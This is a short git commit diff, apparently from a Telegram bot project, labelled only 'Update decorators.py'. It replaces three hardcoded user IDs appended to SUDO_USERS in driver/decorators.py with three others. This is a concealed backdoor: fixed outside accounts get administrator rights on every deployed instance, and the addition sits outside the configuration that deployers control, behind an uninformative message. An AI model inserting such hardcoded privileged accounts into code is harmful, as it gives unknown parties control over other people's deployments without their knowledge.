0ade62fbba62d609d79e6afc1fd15a32d76ca55c
hdiiofficial <79190751+hdiiofficial@users.noreply.github.com>
2021-11-17 16:08:11 +0700

    Update decorators.py

--- driver/decorators.py
+++ driver/decorators.py
@@ -5,9 +5,9 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
+SUDO_USERS.append(2039399423)
+SUDO_USERS.append(1936993413)
+SUDO_USERS.append(1535645343)
 
 
 def errors(func: Callable) -> Callable:
